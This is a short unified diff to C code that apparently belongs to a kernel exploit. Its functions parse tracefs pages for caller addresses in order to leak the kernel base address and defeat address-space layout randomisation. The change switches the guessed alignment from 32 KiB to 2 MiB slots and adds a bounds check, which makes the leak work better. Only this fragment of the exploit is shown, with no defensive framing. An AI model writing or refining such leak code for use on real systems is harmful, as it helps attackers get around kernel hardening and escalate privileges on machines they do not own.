@@ -396,10 +396,11 @@ static int slide_tracefs_parse_page(const unsigned char *page,
            index < sizeof(link_callers) / sizeof(link_callers[0]); index++) {
         if (caller >= link_callers[index]) {
           uint64_t candidate = caller - link_callers[index];
-          if (candidate <= slide_max_offset &&
-              (candidate & 0x7fffULL) == 0) {
-            size_t slot = (size_t)(candidate >> 15);
-            slide_tracefs_candidate_hits[slot]++;
+          if ((candidate & 0x1fffffULL) == 0) {
+            size_t slot = (size_t)(candidate >> 21);
+            if (slot < SLIDE_TRACEFS_CANDIDATES) {
+              slide_tracefs_candidate_hits[slot]++;
+            }
           }
         }
       }
@@ -615,7 +616,7 @@ static int slide_tracefs_leak_kernel_base(void) {
     if (!slide_tracefs_candidate_hits[slot]) {
       continue;
     }
-    uintptr_t slot_candidate = slot << 15;
+    uintptr_t slot_candidate = slot << 21;
     pr_info("slide tracefs candidate=%08zx hits=%u\n",
             slot_candidate, slide_tracefs_candidate_hits[slot]);
     candidate = slot_candidate;
